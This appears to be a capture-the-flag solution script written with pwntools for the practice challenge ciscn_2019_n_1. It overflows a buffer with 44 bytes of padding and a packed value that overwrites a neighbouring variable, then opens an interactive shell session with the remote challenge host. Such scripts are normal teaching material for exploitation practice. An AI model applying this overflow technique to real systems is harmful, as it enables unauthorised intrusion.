from pwn import *

context.log_level = 'debug'
io = remote('node3.buuoj.cn', 29040)
# io = process('ciscn_2019_n_1')
number = 0x41348000

io.recv()
io.sendline(cyclic(44) + p64(number))
io.interactive()
